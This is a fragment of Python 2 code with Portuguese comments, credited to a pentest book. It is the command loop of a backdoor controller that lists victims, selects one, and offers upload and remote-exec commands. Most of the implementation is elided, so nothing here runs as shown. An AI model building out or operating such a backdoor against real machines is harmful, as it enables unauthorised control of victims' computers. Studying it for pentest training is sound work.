# -*- coding: utf-8 -*-
# Código totalmente retirado do Livro Python para Pentest do Daniel Moreno
...
while True: #inicia um while infinito com a interface de gerenciamento do backdoor
    try: #inicia um try para que possua tratamento de erros caso ocorra alguma interrucao que e informada pelo except
        ...
        if comando == "": #verifica se o que foi digitado foi apenas um ENTER, caso seja ele da um pass
            pass
        elif comando == "vitimas": #caso vitimas seja digitado exibe a coluna com IDs das vitimas
            print "\nID\tNOME"
            for x,y in enumerate(vitimas): #cria o valor de ID dinamico pelo enumerate, X e o valor da enumeracao ID e y o objeto vitima para saber o nome da vitima y.nome
                print x, "\t", y.nome, "\n"
        elif comando.startswith("vitima"): #verifica se o comando digitado iniciar com vitima, caso ocorra interrupcao e tratado pelo except
            try:
            ...
            try: #evitando interrupcoes
                ...
                print "Aguarde até que o Upload seja concluido..."
            ...
            try: #interrupcao
                ...
                print "Uso: exec arquivo (parametro)"
        ...
        print "CTRL+C pressionado, excluindo vitima"
